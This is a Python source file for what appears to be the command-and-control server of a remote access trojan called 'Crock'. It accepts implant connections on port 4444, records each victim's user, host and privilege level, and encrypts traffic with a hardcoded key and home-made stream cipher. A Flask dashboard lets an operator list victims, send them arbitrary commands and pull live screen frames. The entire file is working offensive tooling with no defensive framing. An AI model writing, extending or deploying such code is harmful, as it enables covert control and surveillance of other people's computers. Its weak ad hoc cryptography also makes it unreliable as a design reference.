#!/usr/bin/env python3
import socket
import threading
import json
import struct
import time
import select
import hashlib
import os
from flask import Flask, send_from_directory, request, jsonify

PORT = 4444
WEB = 5000
KEY = b"CrockKey2026!!CrockKey2026!!!!!"
AUTH_TOKEN = os.environ.get("CROCK_TOKEN", "crock-local-token")
MAX_MSG = 8 * 1024 * 1024

app = Flask(__name__)
clients = {}
lock = threading.Lock()
next_id = 1

BASE = os.path.dirname(os.path.abspath(__file__))

def check_auth():
    token = request.headers.get("X-Auth") or request.args.get("token")
    if token != AUTH_TOKEN:
        return False
    return True

def keystream(counter, length):
    out = b""
    c = counter
    while len(out) < length:
        h = hashlib.sha256(KEY + struct.pack("<I", c)).digest()
        out += h
        c += 1
    return out[:length]

def mac(data: bytes) -> bytes:
    return hashlib.sha256(KEY + data).digest()[:8]

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def mark_dead(cid):
    with lock:
        if cid in clients:
            clients[cid]["alive"] = False
            try:
                clients[cid]["conn"].close()
            except:
                pass

def client_handler(conn, addr, cid):
    try:
        conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        raw = recvall(conn, 4)
        if not raw:
            return
        length = struct.unpack('>I', raw)[0]
        if length == 0 or length > MAX_MSG:
            return
        payload = recvall(conn, length)
        if not payload or len(payload) != length:
            return

        send_ctr = 0x1337
        recv_ctr = 0x1337

        def dec(data):
            nonlocal recv_ctr
            ks = keystream(recv_ctr, len(data))
            recv_ctr += (len(data) + 31) // 32
            plain = bytes(a ^ b for a, b in zip(data, ks))
            if len(plain) < 8:
                return b""
            tag, msg = plain[:8], plain[8:]
            if tag != mac(msg):
                return b""
            return msg

        try:
            info = json.loads(dec(payload).decode(errors='ignore'))
        except:
            info = {"u": "?", "h": "?", "a": 0}

        io_lock = threading.Lock()
        with lock:
            clients[cid] = {
                "conn": conn,
                "addr": addr,
                "info": info,
                "alive": True,
                "io_lock": io_lock,
                "send_ctr": send_ctr,
                "recv_ctr": recv_ctr,
                "latest_frame": None,
                "streaming": False
            }
        print(f"[+] Client {cid} online")

        # Keep the handler alive. Do not peek/read here —
        # it races with /cmd and kills healthy connections.
        while True:
            with lock:
                if cid not in clients or not clients[cid]["alive"]:
                    break
            time.sleep(2)
    except Exception:
        mark_dead(cid)
    finally:
        mark_dead(cid)

def start_listener():
    global next_id
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', PORT))
    srv.listen(10)
    print(f"[*] Listening on {PORT}")
    while True:
        conn, addr = srv.accept()
        cid = next_id
        next_id += 1
        threading.Thread(target=client_handler, args=(conn, addr, cid), daemon=True).start()

@app.route('/')
def index():
    return send_from_directory(BASE, 'dashboard.html')

@app.route('/clients')
def list_clients():
    if not check_auth():
        return jsonify({"error": "unauthorized"}), 401
    with lock:
        result = []
        for cid, c in list(clients.items()):
            if c.get("alive"):
                i = c["info"]
                result.append({
                    "id": cid,
                    "u": i.get("u", "?"),
                    "h": i.get("h", "?"),
                    "ip": c["addr"][0],
                    "a": i.get("a", 0)
                })
    return jsonify(result)

@app.route('/frame')
def get_frame():
    if not check_auth():
        return jsonify({"error": "unauthorized"}), 401
    cid = request.args.get("id", type=int)
    with lock:
        if cid not in clients or not clients[cid].get("alive"):
            return jsonify({"frame": None})
        frame = clients[cid].get("latest_frame")
    return jsonify({"frame": frame})

@app.route('/cmd', methods=['POST'])
def command():
    if not check_auth():
        return jsonify({"error": "unauthorized"}), 401
    data = request.json or {}
    cid = data.get("id")
    cmd = data.get("cmd", "")
    with lock:
        if cid not in clients or not clients[cid].get("alive"):
            return jsonify({"out": "offline"})
        conn = clients[cid]["conn"]
        io_lock = clients[cid]["io_lock"]

    try:
        with io_lock:
            with lock:
                sc = clients[cid]["send_ctr"]
                rc = clients[cid]["recv_ctr"]
            raw_cmd = cmd.encode()
            tag = mac(raw_cmd)
            body = tag + raw_cmd
            ks = keystream(sc, len(body))
            payload = bytes(a ^ b for a, b in zip(body, ks))
            with lock:
                clients[cid]["send_ctr"] = sc + (len(body) + 31) // 32

            conn.sendall(struct.pack('>I', len(payload)) + payload)

            raw = recvall(conn, 4)
            if not raw:
                raise ConnectionError("no reply")
            length = struct.unpack('>I', raw)[0]
            if length == 0 or length > MAX_MSG:
                raise ValueError("bad length")
            resp = recvall(conn, length)
            if not resp or len(resp) != length:
                raise ConnectionError("short body")

            ks2 = keystream(rc, len(resp))
            plain = bytes(a ^ b for a, b in zip(resp, ks2))
            with lock:
                clients[cid]["recv_ctr"] = rc + (len(resp) + 31) // 32

            if len(plain) < 8:
                raise ValueError("no mac")
            tag_r, msg = plain[:8], plain[8:]
            if tag_r != mac(msg):
                raise ValueError("bad mac")
            text = msg.decode(errors='ignore')

            if cmd == "stream_start" and text == "stream started":
                def reader():
                    with lock:
                        clients[cid]["streaming"] = True
                    try:
                        while True:
                            with lock:
                                if cid not in clients or not clients[cid].get("streaming") or not clients[cid].get("alive"):
                                    break
                            raw = recvall(conn, 4)
                            if not raw:
                                break
                            length = struct.unpack('>I', raw)[0]
                            if length == 0 or length > MAX_MSG:
                                break
                            resp = recvall(conn, length)
                            if not resp:
                                break
                            with lock:
                                rc = clients[cid]["recv_ctr"]
                            ks2 = keystream(rc, len(resp))
                            frame_plain = bytes(a ^ b for a, b in zip(resp, ks2))
                            with lock:
                                clients[cid]["recv_ctr"] = rc + (len(resp) + 31) // 32
                            if len(frame_plain) < 8 or frame_plain[:8] != mac(frame_plain[8:]):
                                continue
                            text = frame_plain[8:].decode(errors='ignore')
                            if text.startswith("FRAME:"):
                                with lock:
                                    clients[cid]["latest_frame"] = text[6:]
                    finally:
                        with lock:
                            if cid in clients:
                                clients[cid]["streaming"] = False
                threading.Thread(target=reader, daemon=True).start()
                return jsonify({"out": "stream started"})

            return jsonify({"out": text})
    except Exception as e:
        mark_dead(cid)
        return jsonify({"out": str(e)})

if __name__ == '__main__':
    threading.Thread(target=start_listener, daemon=True).start()
    print(f"[*] Web UI on http://127.0.0.1:{WEB}")
    app.run(host='127.0.0.1', port=WEB, threaded=True)
